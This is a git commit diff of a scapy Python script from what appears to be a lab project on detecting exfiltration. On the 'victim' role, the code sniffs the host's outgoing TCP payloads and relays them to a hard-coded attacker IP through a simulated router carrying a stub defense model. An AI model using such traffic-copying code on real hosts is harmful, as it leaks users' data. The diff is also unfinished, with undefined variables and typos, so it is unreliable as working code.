50b1aaf5eb9cd732c3cc1f34fef4fc769c13d789
Chris <christopherparks@nevada.unr.edu>
2021-04-17 02:51:44 -0400

    Code Refactor; Victim Sends Packets to Router
    Checking if router receives

--- sniffer.py
+++ sniffer.py
@@ -6,37 +6,94 @@
 from scapy.all import *
 from copy import deepcopy
 
-packets = []
 role = 'victim'
 
+victim_ip = '129.254.0.8'
+attacker_ip = '129.254.0.7'
+router_ip = '129.254.0.10'
+
+#Modular packet sniffing function
 def packet_sniffer(my_filter, my_prn):
     print('Calling packet sniffer function.')
     pkt = sniff(filter=my_filter, count=5, iface='eth1', prn=my_prn)
 
-def packet_storage(packet):
-    packets.append(packet)
+#Send packets to a destination via the router VM. The router VM
+#simulates a router on the network that is equipped with the
+#defense model. The packet is sent to the router, which processes
+#and reroutes the packet to its intended recipient.
+def send_to_router(packet):
+    true_src = packet[IP].src
+    true_dst = packet[IP].dst
+    true_dport = packet[TCP].dport
+    true_load = packet[Raw].load.decode("utf-8")
+
+    load_append = '|ORIG_DST=' + true_dst
+
+    new_packet = IP(dst=router_ip)/TCP(dport=true_dport)/Raw(load=true_load + load_append)
+
+    print('Sending packet to router:', new_packet.show())
+    r1 = sr1(new_packet, timeout=5)
+
+#Victim functions
+#---
+
+#Sends packet to attacker (via the router VM)
+def send_to_attacker(packet):
+    try:
+        data = packet[Raw].load.decode("utf-8")
+    except:
+        data = ''
+    data += '|VICT_IP='+get_if_addr('eth1')
+    new_packet = IP(dst=attacker_ip)/TCP(dport=80)/Raw(load=data)
+
+    send_to_router(new_packet)
+#---
+
+#Router functions
+#---
+
+# Append the IP address info of the original sender (before being 
+# forwarded by the router)
+# Format is: |ORIG_SRC:xxx.xxx.xxx.xxx
+def append_orig_source(data, orig_source):
+    new_data = data + '|ORIG_SRC=' + orig_source
+
+    return new_data
 
 def reroute_packet(packet):
+    try:
+        data = packet[Raw].load.decode("utf-8")
+    except:
+        data = ''
+    data = append_orig_source(data, orig_source)
+
+    forwarded_packet = IP()/TCP()/Raw(load=data)
+
+    #Get destination address that was embedded in the payload
+    dst_addr = parse_payload(data)
+        
+    # IP address is always the first in the list 
+    
+        
+    # Source = hardcoded router's IP address 
+    forwarded_packet[IP].src = get_if_addr('eth1')
+    forwarded_packet[IP].dst = dst_addr
+    r1 = sr1(new_packet, timeout=5)
+        
+    forwarded_packet[TCP].sport = packet[TCP].sport
+    forwarded_packet[IP].dport = packet[TCP].dport
+
+    print('Forwarded packet:', forwrded_packet.show())
+    r1 = sr1(forwarded_packet, timeout=5)
 
 def defense_model(packet):
     return 0
 
-def send_to_attacker():
-    actual_destination = 'DUP_PL_DEST=169.254.0.7'
-    for packet in packets:
-        new_packet = IP()/TCP()/Raw(load=actual_destination)
-        new_packet[IP].dst = '169.254.0.10'
-    
-        new_packet[TCP].dport = 80
-
-        print('new_packet:', new_packet.show())
-
-        r1 = sr1(new_packet, timeout=2)
-
-def parse_payload(data):
-
+#Parses payload to get the true desination address of the packet.
+#Needed to implement a 'router' that has the defense model.
+def get_packet_destination(data):
     # Look for this at the end of the payload
-    test_field = "|DUP_PL_DEST:"
+    test_field = "|ORIG_DST="
                                                          
     if test_field in data:
         # end info = information after the main payload 
@@ -44,56 +101,17 @@ def parse_payload(data):
                                                          
     # Split the end substring by | delimiter 
     end_list = end_info.split('|')
-                                                         
-    return end_list
-
-# Append the IP address info of the original sender (before being 
-# forwarded by the router)
-# Format is: |ORIG_SOURCE:xxxx.xxxx.xxxx.xxxx
-def append_orig_source(data, orig_source):
-    new_data = data + '|ORIG_SOURCE:' + orig_source
-
-    return new_data
-
-
-def forward_packets():
-    for packet in packets:
-        data = packet[Raw].load
-        data = append_orig_source(data, orig_source)
-
-        forwarded_packet = IP()/TCP()/Raw(load=data)
-
-        info_list = parse_payload(data)
-        
-        # IP address is always the first in the list 
-        ip_addr = info_list[0]
-        
-
-        # Source = hardcoded router's IP address 
-        forwarded_packet[IP].src = "192.168.56.105"
-        forwarded_packet[IP].dst = ip_addr
-        r1 = sr1(new_packet, timeout=5)
-        
-        forwarded_packet[TCP].sport = packet[TCP].sport
-        forwarded_packet[IP].dport = packet[TCP].dport
-
-        print('Forwarded packet:', forwrded_packet.show())
-
-        r1 = sr1(forwarded_packet, timeout=5)
     
+    print(end_list[0])
+    return end_list[0]
 
+#---
 
-def print_packets():
-    for packet in packets:
-        print('Packet source IP:', packet[IP].src)
-    
 
 if __name__=='__main__':
     if(role == 'victim'):
         local_ip = get_if_addr('eth1')
-        packet_sniffer('src host ' + local_ip + ' and tcp', packet_storage)
-        print_packets()
-        send_to_attacker()
+        packet_sniffer('src host ' + local_ip + ' and tcp', send_to_attacker)
     elif(role == 'router'):
         packet_sniffer('dst host ' + local_ip + ' and tcp', reroute_packet)
     
